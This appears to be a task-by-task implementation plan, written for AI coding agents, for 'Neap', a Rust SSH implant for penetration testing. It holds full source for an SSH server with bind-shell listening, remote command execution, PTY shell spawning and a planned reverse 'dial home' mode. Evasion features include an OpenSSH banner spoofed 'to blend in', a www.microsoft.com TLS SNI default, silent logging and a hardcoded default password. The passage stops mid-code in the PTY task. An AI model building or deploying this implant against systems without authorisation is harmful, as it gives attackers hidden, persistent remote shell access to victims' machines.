# Neap Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build Neap — a pure-Rust, statically-linked SSH server for penetration testing with reverse/bind shells, SFTP, port forwarding, and TLS wrapping, achieving full feature parity with [Undertow](https://github.com/Real-Fruit-Snacks/Undertow).

**Architecture:** Async-first using `russh` for SSH protocol + `tokio` for async I/O. The `russh::server::Server` trait creates per-connection handlers; the `russh::server::Handler` async trait dispatches SSH events (auth, PTY, exec, subsystems, forwarding). Platform-specific PTY behind `#[cfg]` gates. TLS via pure-Rust `rustls`.

**Tech Stack:** Rust, russh 0.46, russh-keys 0.46, russh-sftp 0.2, tokio 1, tokio-rustls 0.26, rustls 0.23, rcgen 0.13, nix 0.29 (unix), windows-sys 0.59 (windows), clap 4 (optional)

**Spec:** `docs/superpowers/specs/2026-04-06-neap-design.md`

**Reference implementation:** https://github.com/Real-Fruit-Snacks/Undertow (Go source — consult for protocol details and edge cases)

---

## File Map

| File | Responsibility |
|------|---------------|
| `Cargo.toml` | Dependencies, features, release profile |
| `build.rs` | Read env vars, emit `cargo:rustc-env` for compile-time config |
| `src/main.rs` | Entry point, CLI parsing (clap), mode selection, logging init |
| `src/config.rs` | Typed constants from compile-time env vars with defaults |
| `src/error.rs` | `NeapError` enum, `From` impls for russh/io/tls errors |
| `src/server.rs` | `NeapServer` (Server trait), `NeapHandler` (Handler trait), key gen, auth |
| `src/session.rs` | PTY dispatch, command execution, port-forward-only session |
| `src/pty/mod.rs` | `PtyHandle` trait abstraction + `create_pty()` dispatcher |
| `src/pty/unix.rs` | Linux PTY via `nix::pty::openpty`, fork, exec shell |
| `src/pty/windows.rs` | Windows ConPTY via `windows-sys`, legacy fallback |
| `src/transport.rs` | Bind listener, reverse dial-home, TLS wrapping |
| `src/sftp.rs` | SFTP subsystem via `russh-sftp` SftpSession trait |
| `src/forwarding.rs` | `direct-tcpip` (local) and `tcpip-forward` (remote) handlers |
| `src/info.rs` | `ExtraInfo` struct, `rs-info` channel send/receive |
| `build.sh` | Build wrapper — env vars → cargo, handler script gen, UX |
| `Makefile` | Cross-compilation targets, clean, compress |

---

## Task 1: Project Scaffold

**Files:**
- Create: `Cargo.toml`
- Create: `build.rs`
- Create: `src/main.rs`
- Create: `src/config.rs`
- Create: `src/error.rs`
- Create: `.gitignore`

- [ ] **Step 1: Create `.gitignore`**

```gitignore
/target
/bin
*.exe
*.pdb
```

- [ ] **Step 2: Create `Cargo.toml`**

```toml
[package]
name = "neap"
version = "1.0.0"
edition = "2021"
license = "GPL-3.0"
description = "Statically-linked SSH server for penetration testing"

[features]
default = ["cli"]
cli = ["dep:clap"]

[dependencies]
russh = "0.46"
russh-keys = "0.46"
russh-sftp = "0.2"
tokio = { version = "1", features = ["full"] }
tokio-rustls = "0.26"
rustls = { version = "0.23", default-features = false, features = ["ring", "logging", "std", "tls12"] }
rcgen = "0.13"
log = "0.4"
env_logger = "0.11"
subtle = "2.6"
clap = { version = "4", features = ["derive"], optional = true }

[target.'cfg(unix)'.dependencies]
nix = { version = "0.29", features = ["term", "pty", "process", "signal"] }

[target.'cfg(windows)'.dependencies]
windows-sys = { version = "0.59", features = ["Win32_System_Console", "Win32_Foundation", "Win32_System_Threading", "Win32_Security", "Win32_Storage_FileSystem"] }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
```

- [ ] **Step 3: Create `build.rs`**

```rust
use std::env;

fn main() {
    let vars = [
        ("NEAP_PASSWORD", "letmeinbrudipls"),
        ("NEAP_PUBKEY", ""),
        ("NEAP_SHELL", "/bin/bash"),
        ("NEAP_LUSER", "svc"),
        ("NEAP_LHOST", ""),
        ("NEAP_LPORT", "31337"),
        ("NEAP_BPORT", "0"),
        ("NEAP_NOCLI", ""),
        ("NEAP_TLS_WRAP", ""),
        ("NEAP_TLS_SNI", "www.microsoft.com"),
    ];

    for (key, default) in &vars {
        let value = env::var(key).unwrap_or_else(|_| default.to_string());
        println!("cargo:rustc-env={}={}", key, value);
        // Re-run build.rs if these env vars change
        println!("cargo:rerun-if-env-changed={}", key);
    }

    // Inject version from Cargo.toml
    println!(
        "cargo:rustc-env=NEAP_VERSION={}",
        env::var("CARGO_PKG_VERSION").unwrap()
    );
}
```

- [ ] **Step 4: Create `src/config.rs`**

```rust
/// Compile-time configuration injected by build.rs from environment variables.
/// Defaults match Undertow's defaults for drop-in compatibility.

pub const PASSWORD: &str = env!("NEAP_PASSWORD");
pub const PUBKEY: &str = env!("NEAP_PUBKEY");
pub const DEFAULT_SHELL: &str = env!("NEAP_SHELL");
pub const LUSER: &str = env!("NEAP_LUSER");
pub const LHOST: &str = env!("NEAP_LHOST");
pub const LPORT: &str = env!("NEAP_LPORT");
pub const BPORT: &str = env!("NEAP_BPORT");
pub const NOCLI: &str = env!("NEAP_NOCLI");
pub const TLS_WRAP: &str = env!("NEAP_TLS_WRAP");
pub const TLS_SNI: &str = env!("NEAP_TLS_SNI");
pub const VERSION: &str = env!("NEAP_VERSION");

/// SSH server version banner — spoofed as OpenSSH to blend in.
pub const SSH_VERSION: &str = "OpenSSH_8.9";
```

- [ ] **Step 5: Create `src/error.rs`**

```rust
use std::fmt;

#[derive(Debug)]
pub enum NeapError {
    Io(std::io::Error),
    Ssh(russh::Error),
    SshKey(russh_keys::Error),
    Tls(rustls::Error),
    AddrParse(std::net::AddrParseError),
    InvalidPort(String),
    Config(String),
}

impl fmt::Display for NeapError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Io(e) => write!(f, "IO error: {}", e),
            Self::Ssh(e) => write!(f, "SSH error: {}", e),
            Self::SshKey(e) => write!(f, "SSH key error: {}", e),
            Self::Tls(e) => write!(f, "TLS error: {}", e),
            Self::AddrParse(e) => write!(f, "Address parse error: {}", e),
            Self::InvalidPort(s) => write!(f, "Invalid port: {}", s),
            Self::Config(s) => write!(f, "Config error: {}", s),
        }
    }
}

impl std::error::Error for NeapError {}

impl From<std::io::Error> for NeapError {
    fn from(e: std::io::Error) -> Self {
        Self::Io(e)
    }
}

impl From<russh::Error> for NeapError {
    fn from(e: russh::Error) -> Self {
        Self::Ssh(e)
    }
}

impl From<russh_keys::Error> for NeapError {
    fn from(e: russh_keys::Error) -> Self {
        Self::SshKey(e)
    }
}

impl From<rustls::Error> for NeapError {
    fn from(e: rustls::Error) -> Self {
        Self::Tls(e)
    }
}

impl From<std::net::AddrParseError> for NeapError {
    fn from(e: std::net::AddrParseError) -> Self {
        Self::AddrParse(e)
    }
}

pub type Result<T> = std::result::Result<T, NeapError>;
```

- [ ] **Step 6: Create `src/main.rs` skeleton**

```rust
mod config;
mod error;

use log;

fn main() {
    // Logging off by default — silent binary
    let _ = env_logger::builder()
        .filter_level(log::LevelFilter::Off)
        .try_init();

    log::info!("neap v{}", config::VERSION);
}
```

- [ ] **Step 7: Verify it compiles**

Run: `cargo build`
Expected: Successful compilation with no errors.

- [ ] **Step 8: Run the binary**

Run: `cargo run`
Expected: Binary runs and exits silently (no output — logging is off by default).

- [ ] **Step 9: Commit**

```bash
git add .gitignore Cargo.toml Cargo.lock build.rs src/main.rs src/config.rs src/error.rs
git commit -m "feat: project scaffold with config, error types, and build.rs"
```

---

## Task 2: CLI Parsing & Mode Selection

**Files:**
- Modify: `src/main.rs`
- Modify: `src/config.rs`

- [ ] **Step 1: Add `Params` struct and CLI parsing to `src/main.rs`**

```rust
mod config;
mod error;

use error::Result;
use std::process;

/// Runtime parameters — either parsed from CLI args or from compile-time config.
pub struct Params {
    pub luser: String,
    pub lhost: String,
    pub lport: u16,
    pub bind_port: u16,
    pub listen: bool,
    pub shell: String,
    pub no_shell: bool,
    pub verbose: bool,
    pub tls_wrap: bool,
    pub tls_sni: String,
}

#[cfg(feature = "cli")]
fn parse_params() -> Result<Params> {
    use clap::Parser;

    #[derive(Parser)]
    #[command(
        name = "neap",
        version = config::VERSION,
        about = "Statically-linked SSH server for penetration testing"
    )]
    struct Cli {
        /// Start in listening mode (bind shell)
        #[arg(short = 'l', long = "listen")]
        listen: bool,

        /// Port for SSH connections
        #[arg(short = 'p', long = "port", default_value = config::LPORT)]
        port: u16,

        /// Bind port after dialling home (reverse mode, 0 = random)
        #[arg(short = 'b', long = "bind-port", default_value = config::BPORT)]
        bind_port: u16,

        /// Shell to spawn
        #[arg(short = 's', long = "shell", default_value = config::DEFAULT_SHELL)]
        shell: String,

        /// Deny shell/exec/subsystem and local port forwarding
        #[arg(short = 'N', long = "no-shell")]
        no_shell: bool,

        /// Verbose logging to stderr
        #[arg(short = 'v', long = "verbose")]
        verbose: bool,

        /// Optional target: [user@]host
        #[arg(name = "TARGET")]
        target: Option<String>,
    }

    let cli = Cli::parse();

    let (luser, lhost) = match &cli.target {
        Some(target) => {
            let parts: Vec<&str> = target.splitn(2, '@').collect();
            if parts.len() == 2 {
                (parts[0].to_string(), parts[1].to_string())
            } else {
                (config::LUSER.to_string(), parts[0].to_string())
            }
        }
        None => (config::LUSER.to_string(), config::LHOST.to_string()),
    };

    Ok(Params {
        luser,
        lhost,
        lport: cli.port,
        bind_port: cli.bind_port,
        listen: cli.listen,
        shell: cli.shell,
        no_shell: cli.no_shell,
        verbose: cli.verbose,
        tls_wrap: !config::TLS_WRAP.is_empty(),
        tls_sni: config::TLS_SNI.to_string(),
    })
}

#[cfg(not(feature = "cli"))]
fn parse_params() -> Result<Params> {
    let lport: u16 = config::LPORT
        .parse()
        .map_err(|_| error::NeapError::InvalidPort(config::LPORT.to_string()))?;
    let bind_port: u16 = config::BPORT
        .parse()
        .map_err(|_| error::NeapError::InvalidPort(config::BPORT.to_string()))?;

    Ok(Params {
        luser: config::LUSER.to_string(),
        lhost: config::LHOST.to_string(),
        lport,
        bind_port,
        listen: false,
        shell: config::DEFAULT_SHELL.to_string(),
        no_shell: false,
        verbose: false,
        tls_wrap: !config::TLS_WRAP.is_empty(),
        tls_sni: config::TLS_SNI.to_string(),
    })
}

fn main() {
    let params = match parse_params() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Error: {}", e);
            process::exit(1);
        }
    };

    // Init logging: off by default, verbose with -v
    let log_level = if params.verbose {
        log::LevelFilter::Info
    } else {
        log::LevelFilter::Off
    };
    let _ = env_logger::builder().filter_level(log_level).try_init();

    log::info!("neap v{}", config::VERSION);

    let mode = if params.listen || params.lhost.is_empty() {
        "bind"
    } else {
        "reverse"
    };
    log::info!("Mode: {}", mode);
    log::info!("Port: {}", params.lport);

    if mode == "reverse" {
        log::info!("Target: {}@{}", params.luser, params.lhost);
        log::info!("Bind port: {}", params.bind_port);
    }

    if params.tls_wrap {
        log::info!("TLS wrapping enabled (SNI: {})", params.tls_sni);
    }

    // TODO: Hand off to transport::run(params) in Task 5
}
```

- [ ] **Step 2: Verify it compiles and CLI works**

Run: `cargo build`
Expected: Successful compilation.

Run: `cargo run -- --help`
Expected: Help text showing all flags (-l, -p, -b, -s, -N, -v, TARGET).

Run: `cargo run -- -v -l -p 4444`
Expected: Log output showing "Mode: bind", "Port: 4444".

Run: `cargo run -- -v 192.168.1.10`
Expected: Log output showing "Mode: reverse", "Target: svc@192.168.1.10".

Run: `cargo run -- -v kali@192.168.1.10`
Expected: Log output showing "Target: kali@192.168.1.10".

- [ ] **Step 3: Verify NOCLI build**

Run: `cargo build --no-default-features`
Expected: Compiles without clap. Binary uses only compile-time defaults.

- [ ] **Step 4: Commit**

```bash
git add src/main.rs src/config.rs
git commit -m "feat: CLI parsing with clap, mode selection, NOCLI support"
```

---

## Task 3: SSH Server Core

**Files:**
- Create: `src/server.rs`
- Modify: `src/main.rs` (add `mod server`)

This task implements the `russh::server::Server` and `russh::server::Handler` traits — the core SSH server that handles authentication and dispatches channel events.

- [ ] **Step 1: Create `src/server.rs`**

```rust
use std::sync::Arc;

use async_trait::async_trait;
use log;
use russh::server::{Auth, Handler, Msg, Server, Session};
use russh::{Channel, ChannelId, CryptoVec, MethodSet};
use russh_keys::key::KeyPair;
use subtle::ConstantTimeEq;

use crate::config;
use crate::error::Result;

/// Generates an ephemeral Ed25519 host key pair.
/// New key every launch — no persistence, no disk artifacts.
pub fn generate_host_key() -> Result<KeyPair> {
    let key = KeyPair::generate_ed25519()
        .ok_or_else(|| crate::error::NeapError::Config("Failed to generate Ed25519 key".into()))?;
    log::info!("Generated ephemeral Ed25519 host key");
    Ok(key)
}

/// Build the russh server config.
pub fn build_config(host_key: KeyPair) -> russh::server::Config {
    let mut config = russh::server::Config::default();
    config.server_id = russh::SshId::Standard(format!("SSH-2.0-{}", config::SSH_VERSION));
    config.keys.push(host_key);

    // Auth methods
    config.auth_rejection_time = std::time::Duration::from_secs(1);
    config.auth_rejection_time_initial = Some(std::time::Duration::from_secs(0));

    // Set supported auth methods
    let mut methods = MethodSet::PASSWORD;
    if !config::PUBKEY.is_empty() {
        methods |= MethodSet::PUBLICKEY;
    }
    config.methods = methods;

    config
}

/// Factory — creates a new `NeapHandler` for each incoming SSH connection.
#[derive(Clone)]
pub struct NeapServer {
    pub shell: String,
    pub no_shell: bool,
}

impl Server for NeapServer {
    type Handler = NeapHandler;

    fn new_client(&mut self, peer_addr: Option<std::net::SocketAddr>) -> Self::Handler {
        let addr_str = peer_addr
            .map(|a| a.to_string())
            .unwrap_or_else(|| "unknown".to_string());
        log::info!("New connection from {}", addr_str);
        NeapHandler {
            peer_addr: addr_str,
            shell: self.shell.clone(),
            no_shell: self.no_shell,
        }
    }
}

/// Per-connection SSH handler — dispatches auth and channel events.
pub struct NeapHandler {
    pub peer_addr: String,
    pub shell: String,
    pub no_shell: bool,
}

#[async_trait]
impl Handler for NeapHandler {
    type Error = russh::Error;

    /// Password authentication — constant-time comparison.
    async fn auth_password(
        &mut self,
        user: &str,
        password: &str,
    ) -> std::result::Result<Auth, Self::Error> {
        let expected = config::PASSWORD.as_bytes();
        let provided = password.as_bytes();

        // Constant-time comparison to prevent timing attacks
        let passed = if expected.len() == provided.len() {
            expected.ct_eq(provided).into()
        } else {
            false
        };

        if passed {
            log::info!(
                "Successful authentication with password from {}@{}",
                user,
                self.peer_addr
            );
            Ok(Auth::Accept)
        } else {
            log::info!(
                "Invalid password from {}@{}",
                user,
                self.peer_addr
            );
            Ok(Auth::Reject {
                proceed_with_methods: None,
            })
        }
    }

    /// Public key authentication — compare marshalled key bytes.
    async fn auth_publickey(
        &mut self,
        user: &str,
        public_key: &russh_keys::key::PublicKey,
    ) -> std::result::Result<Auth, Self::Error> {
        if config::PUBKEY.is_empty() {
            return Ok(Auth::Reject {
                proceed_with_methods: None,
            });
        }

        let authorized = match russh_keys::parse_public_key_base64(config::PUBKEY) {
            Ok(key) => key,
            Err(e) => {
                log::error!("Failed to parse authorized public key: {}", e);
                return Ok(Auth::Reject {
                    proceed_with_methods: None,
                });
            }
        };

        let passed = public_key == &authorized;

        if passed {
            log::info!(
                "Successful authentication with ssh key from {}@{}",
                user,
                self.peer_addr
            );
            Ok(Auth::Accept)
        } else {
            log::info!(
                "Invalid ssh key from {}@{}",
                user,
                self.peer_addr
            );
            Ok(Auth::Reject {
                proceed_with_methods: None,
            })
        }
    }

    /// Channel open — accept session channels.
    async fn channel_open_session(
        &mut self,
        channel: Channel<Msg>,
        _session: &mut Session,
    ) -> std::result::Result<bool, Self::Error> {
        log::info!("Session channel opened from {}", self.peer_addr);
        Ok(true)
    }

    /// Channel open — accept direct-tcpip (local port forwarding).
    async fn channel_open_direct_tcpip(
        &mut self,
        channel: Channel<Msg>,
        host_to_connect: &str,
        port_to_connect: u32,
        originator_address: &str,
        originator_port: u32,
        _session: &mut Session,
    ) -> std::result::Result<bool, Self::Error> {
        if self.no_shell {
            log::info!(
                "Denying local port forwarding request {}:{} from {}",
                host_to_connect,
                port_to_connect,
                self.peer_addr
            );
            return Ok(false);
        }
        log::info!(
            "Accepted forward to {}:{} from {}",
            host_to_connect,
            port_to_connect,
            self.peer_addr
        );
        // TODO: Spawn forwarding task in Task 10
        Ok(true)
    }

    /// tcpip-forward request — remote port forwarding.
    async fn tcpip_forward(
        &mut self,
        address: &str,
        port: &mut u32,
        session: &mut Session,
    ) -> std::result::Result<bool, Self::Error> {
        log::info!(
            "Attempt to bind at {}:{} granted from {}",
            address,
            port,
            self.peer_addr
        );
        // TODO: Implement remote forwarding in Task 10
        Ok(true)
    }

    /// Session request callback — deny if noShell mode.
    async fn shell_request(
        &mut self,
        channel_id: ChannelId,
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        if self.no_shell {
            log::info!("Denying shell request from {}", self.peer_addr);
            session.channel_failure(channel_id)?;
            return Ok(());
        }
        log::info!("Shell request from {}", self.peer_addr);
        // TODO: Spawn PTY session in Task 7
        session.channel_success(channel_id)?;
        Ok(())
    }

    /// Exec request — run a command.
    async fn exec_request(
        &mut self,
        channel_id: ChannelId,
        data: &[u8],
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        if self.no_shell {
            log::info!("Denying exec request from {}", self.peer_addr);
            session.channel_failure(channel_id)?;
            return Ok(());
        }
        let command = String::from_utf8_lossy(data).to_string();
        log::info!("Command execution requested: '{}' from {}", command, self.peer_addr);
        // TODO: Spawn command exec in Task 6
        session.channel_success(channel_id)?;
        Ok(())
    }

    /// Subsystem request — SFTP.
    async fn subsystem_request(
        &mut self,
        channel_id: ChannelId,
        name: &str,
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        if self.no_shell {
            log::info!("Denying subsystem request from {}", self.peer_addr);
            session.channel_failure(channel_id)?;
            return Ok(());
        }
        log::info!("Subsystem request: '{}' from {}", name, self.peer_addr);
        if name == "sftp" {
            // TODO: Start SFTP handler in Task 9
            session.channel_success(channel_id)?;
        } else {
            session.channel_failure(channel_id)?;
        }
        Ok(())
    }

    /// PTY request — record terminal info for later shell spawn.
    async fn pty_request(
        &mut self,
        channel_id: ChannelId,
        term: &str,
        col_width: u32,
        row_height: u32,
        pix_width: u32,
        pix_height: u32,
        modes: &[(russh::Pty, u32)],
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        log::info!("PTY requested: term={}, {}x{} from {}", term, col_width, row_height, self.peer_addr);
        // TODO: Store PTY info for shell_request in Task 7
        session.channel_success(channel_id)?;
        Ok(())
    }

    /// Window change — resize PTY.
    async fn window_change_request(
        &mut self,
        channel_id: ChannelId,
        col_width: u32,
        row_height: u32,
        pix_width: u32,
        pix_height: u32,
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        log::info!("Window change: {}x{} from {}", col_width, row_height, self.peer_addr);
        // TODO: Resize PTY in Task 7
        Ok(())
    }
}
```

- [ ] **Step 2: Register the module in `src/main.rs`**

Add `mod server;` to the top of `src/main.rs`, after `mod error;`:

```rust
mod config;
mod error;
mod server;
```

- [ ] **Step 3: Verify it compiles**

Run: `cargo build`
Expected: Successful compilation. The `Handler` trait methods may need signature adjustments depending on exact russh 0.46 API — check compiler output and adjust method signatures as needed. The core patterns (auth_password, auth_publickey, channel_open_session, etc.) are correct but exact return types may need tweaking.

**Important:** The `russh` API has evolved across versions. If the compiler reports trait method signature mismatches:
1. Run `cargo doc --open` to see the exact trait signatures for russh 0.46
2. Adjust method signatures in `server.rs` to match
3. The logic inside each method stays the same — only signatures change

- [ ] **Step 4: Commit**

```bash
git add src/server.rs src/main.rs
git commit -m "feat: SSH server core with auth handlers and channel dispatch"
```

---

## Task 4: Transport — Bind Mode

**Files:**
- Create: `src/transport.rs`
- Modify: `src/main.rs` (add `mod transport`, call `run`)

- [ ] **Step 1: Create `src/transport.rs` with bind mode**

```rust
use std::sync::Arc;

use log;
use tokio::net::TcpListener;

use crate::config;
use crate::error::{NeapError, Result};
use crate::server::{build_config, generate_host_key, NeapServer};
use crate::Params;

/// Main entry point — start the server in bind or reverse mode.
pub async fn run(params: &Params) -> Result<()> {
    let host_key = generate_host_key()?;
    let ssh_config = Arc::new(build_config(host_key));

    let neap_server = NeapServer {
        shell: params.shell.clone(),
        no_shell: params.no_shell,
    };

    if params.listen || params.lhost.is_empty() {
        run_bind(params, ssh_config, neap_server).await
    } else {
        run_reverse(params, ssh_config, neap_server).await
    }
}

/// Bind mode — listen on a local port for incoming SSH connections.
async fn run_bind(
    params: &Params,
    config: Arc<russh::server::Config>,
    mut server: NeapServer,
) -> Result<()> {
    let addr = format!("0.0.0.0:{}", params.lport);
    log::info!("Starting ssh server on :{}", params.lport);

    // TODO: TLS wrapping added in Task 12

    russh::server::run(config, &addr, server)
        .await
        .map_err(|e| NeapError::Io(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())))?;

    Ok(())
}

/// Reverse mode — dial home to attacker's SSH server.
async fn run_reverse(
    params: &Params,
    config: Arc<russh::server::Config>,
    server: NeapServer,
) -> Result<()> {
    let target = format!("{}:{}", params.lhost, params.lport);
    log::info!("Dialling home via ssh to {}", target);

    // TODO: Implement reverse connection in Task 11
    Err(NeapError::Config("Reverse mode not yet implemented".into()))
}
```

- [ ] **Step 2: Wire up `main.rs` to call `transport::run`**

Replace the `main` function in `src/main.rs`:

```rust
mod config;
mod error;
mod server;
mod transport;

use error::Result;
use std::process;

pub struct Params {
    pub luser: String,
    pub lhost: String,
    pub lport: u16,
    pub bind_port: u16,
    pub listen: bool,
    pub shell: String,
    pub no_shell: bool,
    pub verbose: bool,
    pub tls_wrap: bool,
    pub tls_sni: String,
}

// ... parse_params() functions stay the same ...

#[tokio::main]
async fn main() {
    let params = match parse_params() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Error: {}", e);
            process::exit(1);
        }
    };

    let log_level = if params.verbose {
        log::LevelFilter::Info
    } else {
        log::LevelFilter::Off
    };
    let _ = env_logger::builder().filter_level(log_level).try_init();

    log::info!("neap v{}", config::VERSION);

    if let Err(e) = transport::run(&params).await {
        log::error!("Fatal: {}", e);
        process::exit(1);
    }
}
```

- [ ] **Step 3: Verify bind mode works**

Run: `cargo build`
Expected: Compiles successfully.

Run: `cargo run -- -v -l -p 2222`
Expected: Log output "Starting ssh server on :2222". The server starts listening (hangs waiting for connections). Ctrl+C to stop.

Run (in another terminal): `ssh -o StrictHostKeyChecking=no -p 2222 test@127.0.0.1`
Expected: Password prompt. Entering the default password `letmeinbrudipls` should authenticate (server logs "Successful authentication"). Shell won't work yet (Task 7), but auth should succeed.

- [ ] **Step 4: Commit**

```bash
git add src/transport.rs src/main.rs
git commit -m "feat: bind mode transport — TCP listener serving SSH"
```

---

## Task 5: Session — Command Execution

**Files:**
- Create: `src/session.rs`
- Modify: `src/server.rs` (wire exec_request to session module)
- Modify: `src/main.rs` (add `mod session`)

- [ ] **Step 1: Create `src/session.rs`**

```rust
use log;
use russh::server::Session;
use russh::{ChannelId, CryptoVec};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;

/// Execute a command and pipe I/O to the SSH channel.
pub async fn exec_command(
    command: &str,
    channel_id: ChannelId,
    session_handle: russh::server::Handle,
) {
    log::info!("Executing command: '{}'", command);

    // Parse command — split on spaces for argv
    let parts: Vec<&str> = command.split_whitespace().collect();
    if parts.is_empty() {
        let _ = session_handle
            .data(channel_id, CryptoVec::from_slice(b"Empty command\n"))
            .await;
        let _ = session_handle.exit_status_request(channel_id, 255).await;
        let _ = session_handle.close(channel_id).await;
        return;
    }

    let mut cmd = Command::new(parts[0]);
    if parts.len() > 1 {
        cmd.args(&parts[1..]);
    }
    cmd.stdout(std::process::Stdio::piped());
    cmd.stderr(std::process::Stdio::piped());
    cmd.stdin(std::process::Stdio::piped());

    let child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            log::error!("Failed to spawn command: {}", e);
            let msg = format!("Command execution failed: {}\n", e);
            let _ = session_handle
                .data(channel_id, CryptoVec::from_slice(msg.as_bytes()))
                .await;
            let _ = session_handle.exit_status_request(channel_id, 255).await;
            let _ = session_handle.close(channel_id).await;
            return;
        }
    };

    let output = match child.wait_with_output().await {
        Ok(o) => o,
        Err(e) => {
            log::error!("Command execution failed: {}", e);
            let _ = session_handle.exit_status_request(channel_id, 255).await;
            let _ = session_handle.close(channel_id).await;
            return;
        }
    };

    // Send stdout
    if !output.stdout.is_empty() {
        let _ = session_handle
            .data(channel_id, CryptoVec::from_slice(&output.stdout))
            .await;
    }

    // Send stderr
    if !output.stderr.is_empty() {
        let _ = session_handle
            .extended_data(channel_id, 1, CryptoVec::from_slice(&output.stderr))
            .await;
    }

    let exit_code = output.status.code().unwrap_or(255) as u32;
    log::info!("Command exited with code {}", exit_code);
    let _ = session_handle.exit_status_request(channel_id, exit_code).await;
    let _ = session_handle.close(channel_id).await;
}
```

- [ ] **Step 2: Wire `exec_request` in `src/server.rs`**

Update the `exec_request` method in `NeapHandler` to spawn the command execution task. The `russh::server::Handler` provides a `Session` which has a `handle()` method to get an async handle for sending data back:

```rust
    async fn exec_request(
        &mut self,
        channel_id: ChannelId,
        data: &[u8],
        session: &mut Session,
    ) -> std::result::Result<(), Self::Error> {
        if self.no_shell {
            log::info!("Denying exec request from {}", self.peer_addr);
            session.channel_failure(channel_id)?;
            return Ok(());
        }
        let command = String::from_utf8_lossy(data).to_string();
        log::info!("Command execution requested: '{}' from {}", command, self.peer_addr);

        session.channel_success(channel_id)?;

        let handle = session.handle();
        tokio::spawn(async move {
            crate::session::exec_command(&command, channel_id, handle).await;
        });

        Ok(())
    }
```

- [ ] **Step 3: Register the module in `src/main.rs`**

Add `mod session;` after `mod server;`:

```rust
mod config;
mod error;
mod server;
mod session;
mod transport;
```

- [ ] **Step 4: Verify command execution works**

Run: `cargo build && cargo run -- -v -l -p 2222`

In another terminal:
Run: `ssh -o StrictHostKeyChecking=no -p 2222 test@127.0.0.1 "echo hello"`
Expected: Password prompt → enter `letmeinbrudipls` → output: `hello`

Run: `ssh -o StrictHostKeyChecking=no -p 2222 test@127.0.0.1 "whoami"`
Expected: Outputs the current username.

- [ ] **Step 5: Commit**

```bash
git add src/session.rs src/server.rs src/main.rs
git commit -m "feat: command execution over SSH"
```

---

## Task 6: PTY — Trait Abstraction

**Files:**
- Create: `src/pty/mod.rs`
- Modify: `src/main.rs` (add `mod pty`)

- [ ] **Step 1: Create `src/pty/mod.rs`**

```rust
#[cfg(unix)]
pub mod unix;
#[cfg(windows)]
pub mod windows;

/// Terminal size information from SSH PTY request.
#[derive(Debug, Clone, Copy)]
pub struct WinSize {
    pub cols: u16,
    pub rows: u16,
    pub pix_width: u16,
    pub pix_height: u16,
}

/// PTY request info carried from pty_request to shell_request.
#[derive(Debug, Clone)]
pub struct PtyInfo {
    pub term: String,
    pub win_size: WinSize,
}
```

- [ ] **Step 2: Create the `src/pty/` directory and register the module**

Run: `mkdir -p src/pty`

Add `mod pty;` to `src/main.rs`:

```rust
mod config;
mod error;
mod pty;
mod server;
mod session;
mod transport;
```

- [ ] **Step 3: Verify it compiles**

Run: `cargo build`
Expected: Compiles. The platform-specific submodules don't exist yet — they're behind `#[cfg]` gates so this is fine.

- [ ] **Step 4: Commit**

```bash
git add src/pty/mod.rs src/main.rs
git commit -m "feat: PTY trait abstraction and types"
```

---

## Task 7: PTY — Unix Implementation

**Files:**
- Create: `src/pty/unix.rs`
- Modify: `src/server.rs` (store PTY info, spawn shell on shell_request)
- Modify: `src/session.rs` (add PTY session handler)

- [ ] **Step 1: Create `src/pty/unix.rs`**

```rust
use std::os::unix::io::{AsRawFd, FromRawFd, OwnedFd};
use std::process::Stdio;

use log;
use nix::pty::{openpty, OpenptyResult};
use nix::sys::termios;
use nix::unistd::{close, dup2, execvp, fork, setsid, ForkResult};
use tokio::fs::File;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::pty::WinSize;

/// Set the terminal window size on a PTY master fd.
pub fn set_win_size(master_fd: i32, win_size: &WinSize) {
    let ws = nix::pty::Winsize {
        ws_row: win_size.rows,
        ws_col: win_size.cols,
        ws_xpixel: win_size.pix_width,
        ws_ypixel: win_size.pix_height,
    };
    unsafe {
        libc::ioctl(master_fd, libc::TIOCSWINSZ, &ws as *const _);
    }
}

/// Spawn a shell in a new PTY. Returns the master fd for I/O.
///
/// Forks a child process that:
/// 1. Creates a new session (setsid)
/// 2. Sets the slave as controlling terminal
/// 3. Execs the shell
///
/// The caller reads/writes the master fd to communicate with the shell.
pub fn spawn_shell(
    shell: &str,
    term: &str,
    win_size: &WinSize,
) -> std::io::Result<OwnedFd> {
    let OpenptyResult { master, slave } = openpty(None, None)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;

    // Set initial window size
    set_win_size(master.as_raw_fd(), win_size);

    match unsafe { fork() } {
        Ok(ForkResult::Child) => {
            // Child process
            drop(master); // Close master in child

            // Create new session and set controlling terminal
            setsid().ok();
            unsafe {
                libc::ioctl(slave.as_raw_fd(), libc::TIOCSCTTY, 0);
            }

            // Redirect stdin/stdout/stderr to slave PTY
            dup2(slave.as_raw_fd(), 0).ok();
            dup2(slave.as_raw_fd(), 1).ok();
            dup2(slave.as_raw_fd(), 2).ok();

            if slave.as_raw_fd() > 2 {
                drop(slave);
            }

            // Set environment
            std::env::set_var("TERM", term);
            if let Ok(user) = std::env::var("HOME").or_else(|_| {
                // Try to get home from current user
                #[cfg(unix)]
                {
                    nix::unistd::User::from_uid(nix::unistd::getuid())
                        .ok()
                        .flatten()
                        .map(|u| u.dir.to_string_lossy().to_string())
                        .ok_or(std::env::VarError::NotPresent)
                }
                #[cfg(not(unix))]
                Err(std::env::VarError::NotPresent)
            }) {
                std::env::set_var("HOME", &user);
            }

            // Exec shell
            let c_shell =
                std::ffi::CString::new(shell).expect("Invalid shell path");
            let args = [c_shell.clone()];
